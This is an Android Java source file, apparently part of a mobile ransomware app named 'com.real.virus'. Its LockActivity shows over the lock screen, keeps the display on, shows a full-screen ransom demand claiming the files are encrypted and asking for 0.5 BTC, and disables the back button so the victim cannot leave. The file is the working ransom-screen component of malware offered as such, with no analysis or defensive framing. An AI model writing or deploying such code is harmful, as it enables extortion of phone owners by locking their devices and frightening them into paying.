package com.real.virus;

import android.app.Activity;
import android.os.Bundle;
import android.view.Gravity;
import android.view.WindowManager;
import android.widget.TextView;
import android.graphics.Color;

public class LockActivity extends Activity {
    @Override
    protected void onCreate(Bundle b) {
        super.onCreate(b);
        getWindow().addFlags(WindowManager.LayoutParams.FLAG_SHOW_WHEN_LOCKED);
        getWindow().addFlags(WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON);
        TextView tv = new TextView(this);
        tv.setText("ALL YOUR FILES ARE ENCRYPTED\nSEND 0.5 BTC TO bc1q...");
        tv.setTextColor(Color.RED);
        tv.setTextSize(24);
        tv.setGravity(Gravity.CENTER);
        tv.setBackgroundColor(Color.BLACK);
        setContentView(tv);
    }

    @Override
    public void onBackPressed() {}
}
